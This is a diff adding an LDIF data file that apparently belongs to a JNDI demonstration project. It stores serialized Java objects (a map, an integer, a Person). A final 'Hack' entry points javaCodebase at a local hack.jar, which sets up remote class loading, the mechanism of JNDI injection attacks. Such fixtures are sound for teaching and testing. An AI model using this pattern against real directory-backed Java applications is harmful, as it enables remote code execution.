@@ -1,0 +1,45 @@
+version: 1
+
+dn: ou=Objects,{{ LDAP_BASE_DN }}
+objectClass: top
+objectClass: organizationalUnit
+ou: Objects
+
+dn: cn=Map,ou=Objects,{{ LDAP_BASE_DN }}
+objectclass: top
+objectclass: javaObject
+objectclass: javaSerializedObject
+objectclass: javaContainer
+javaclassname: java.util.HashMap
+javaSerializedData:: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9
+ hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAAEbmFtZXQADE1pY2hhZW
+ wgVml0enQADG9yZ2FuemlhdGlvbnQAFmlubm9RIERldXRzY2hsYW5kIEdtYkh4
+
+dn: cn=Integer,ou=Objects,{{ LDAP_BASE_DN }}
+objectclass: top
+objectclass: javaObject
+objectclass: javaSerializedObject
+objectclass: javaContainer
+javaclassname: java.lang.Integer
+javaSerializedData:: rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFs
+ dWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAK
+
+dn: cn=Person,ou=Objects,{{ LDAP_BASE_DN }}
+objectclass: top
+objectclass: javaObject
+objectclass: javaSerializedObject
+objectclass: javaContainer
+javaclassname: de.mvitz.jndi.Person
+javaSerializedData:: rO0ABXNyABRkZS5tdml0ei5qbmRpLlBlcnNvbsJ2C8iOlHREAgABTAAE
+ bmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAMTWljaGFlbCBWaXR6
+
+dn: cn=Hack,ou=Objects,{{ LDAP_BASE_DN }}
+objectclass: top
+objectclass: javaObject
+objectclass: javaSerializedObject
+objectclass: javaContainer
+javaclassname: de.mvitz.jndi.remote.Hack
+javaSerializedData:: rO0ABXNyABlkZS5tdml0ei5qbmRpLnJlbW90ZS5IYWNrQQU8WrxIm94C
+ AAB4cA==
+javaCodebase: http://localhost:8000/remote/build/hack.jar
+
